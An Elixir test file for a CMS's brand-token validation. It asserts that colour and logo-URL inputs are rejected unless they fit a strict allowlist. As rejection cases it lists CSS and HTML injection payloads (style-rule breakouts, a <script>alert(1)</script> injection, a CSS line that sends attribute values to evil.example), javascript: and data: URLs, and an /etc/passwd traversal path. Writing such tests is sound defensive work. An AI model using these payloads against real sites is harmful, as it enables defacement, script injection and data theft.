defmodule KilnCMS.CMS.Validations.BrandTokensTest do
  @moduledoc """
  The brand colour lands in a `<style>` block under `style-src 'unsafe-inline'`,
  and the image URLs land in `<img src>`. Both are org-admin input, which is not
  operator input — so the grammar is a hard allowlist, and these are the cases
  that prove it.
  """
  use KilnCMS.DataCase, async: false

  alias KilnCMS.Accounts
  alias KilnCMS.CMS
  alias KilnCMS.CMS.Validations.BrandTokens

  setup do
    %{org: seed_org(), admin: platform_admin()}
  end

  describe "normalize_color/1" do
    test "accepts and canonicalizes hex" do
      assert BrandTokens.normalize_color("#1d4ed8") == "#1d4ed8"
      assert BrandTokens.normalize_color("#1D4ED8") == "#1d4ed8"
      assert BrandTokens.normalize_color("  #1d4ed8  ") == "#1d4ed8"
      assert BrandTokens.normalize_color("#F00") == "#ff0000"
    end

    test "rejects everything else" do
      for bad <- [
            "red",
            "#12345",
            # alpha would silently break the contrast pairing
            "#ff000080",
            "oklch(55% 0.2 264)",
            "color-mix(in oklch, red, blue)",
            "var(--x)",
            "url(https://evil.example/x)",
            "expression(alert(1))",
            nil,
            123
          ] do
        assert BrandTokens.normalize_color(bad) == nil, "#{inspect(bad)} was accepted"
      end
    end
  end

  describe "brand_color on a real write" do
    test "rejects CSS injection payloads at the action, writing no row", ctx do
      payloads = [
        # defacement / clickjacking on every page of the site
        "#fff; position:fixed; inset:0; z-index:9999; background:#000",
        # breaking out of the rule into arbitrary selectors
        "#fff} body{display:none}",
        # terminating the raw-text <style> element itself
        "#fff</style><script>alert(1)</script>",
        "#fff/**/;background:red",
        "#fff\n; background: red",
        ~S|#fff; background: url("//evil.example/?x=" attr(value))|
      ]

      for payload <- payloads do
        assert {:error, %Ash.Error.Invalid{}} =
                 CMS.save_site_branding(%{brand_color: payload},
                   actor: ctx.admin,
                   tenant: ctx.org
                 ),
               "#{inspect(payload)} was accepted"
      end

      assert {:ok, []} = CMS.list_site_branding(tenant: ctx.org, authorize?: false)
    end

    test "normalizes an accepted colour on write", ctx do
      assert {:ok, row} =
               CMS.save_site_branding(%{brand_color: "#F00"}, actor: ctx.admin, tenant: ctx.org)

      assert row.brand_color == "#ff0000"
    end
  end

  describe "image URLs" do
    test "accepts same-origin relative paths", ctx do
      for url <- ["/images/logo.svg", "/uploads/abc123.png"] do
        assert {:ok, _row} =
                 CMS.save_site_branding(%{logo_url: url}, actor: ctx.admin, tenant: ctx.org),
               "#{url} was rejected"
      end
    end

    test "rejects off-scheme and traversal URLs", ctx do
      for url <- [
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=",
            "http://evil.example/logo.png",
            "//evil.example/logo.png",
            "/../../etc/passwd"
          ] do
        assert {:error, %Ash.Error.Invalid{}} =
                 CMS.save_site_branding(%{logo_url: url}, actor: ctx.admin, tenant: ctx.org),
               "#{url} was accepted"
      end
    end

    test "rejects an https host the CSP img-src would block" do
      # Validating at write time turns a silently-blank logo in production into
      # an error in the settings form.
      ctx = %{org: seed_org(), admin: platform_admin()}

      assert {:error, %Ash.Error.Invalid{}} =
               CMS.save_site_branding(%{logo_url: "https://cdn.evil.example/logo.png"},
                 actor: ctx.admin,
                 tenant: ctx.org
               )
    end

    test "accepts an https host the operator allowlisted via CSP_IMG_SRC", ctx do
      original = Application.get_env(:kiln_cms, :csp_img_src, [])
      Application.put_env(:kiln_cms, :csp_img_src, ["https://cdn.example.com"])
      on_exit(fn -> Application.put_env(:kiln_cms, :csp_img_src, original) end)

      assert {:ok, row} =
               CMS.save_site_branding(%{logo_url: "https://cdn.example.com/logo.png"},
                 actor: ctx.admin,
                 tenant: ctx.org
               )

      assert row.logo_url == "https://cdn.example.com/logo.png"
    end
  end

  defp seed_org do
    Ash.Seed.seed!(Accounts.Organization, %{
      name: "Tokens Org",
      slug: "tokens-#{System.unique_integer([:positive])}",
      status: :active
    })
  end

  defp platform_admin do
    Ash.Seed.seed!(Accounts.User, %{
      email: "tokens-admin-#{System.unique_integer([:positive])}@example.com",
      hashed_password: Bcrypt.hash_pwd_salt("password1234!"),
      confirmed_at: DateTime.utc_now(),
      role: :admin
    })
  end
end
